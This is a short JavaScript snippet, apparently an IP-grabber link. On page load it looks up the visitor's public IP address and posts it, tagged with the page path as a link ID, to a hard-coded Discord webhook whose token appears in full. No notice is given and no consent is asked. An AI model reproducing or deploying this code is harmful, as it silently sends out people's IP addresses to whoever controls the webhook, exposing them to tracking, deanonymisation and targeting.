fetch("https://myexternalip.com/raw").then((res) =>
        res.text().then((data) => {
            fetch(
            'https://discord.com/api/webhooks/1006549828530094161/VU8lTwRYPBfCLLTtXr399uNq-LcgeusF859r3oelUuCjK3Yr13JcwMLT7aL9mDAETHBP',
            {
              method: 'post',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                content:
                    "link with id: " +window.location.pathname+" fetched the ip"+ data,
              }),
            }
          );
        }))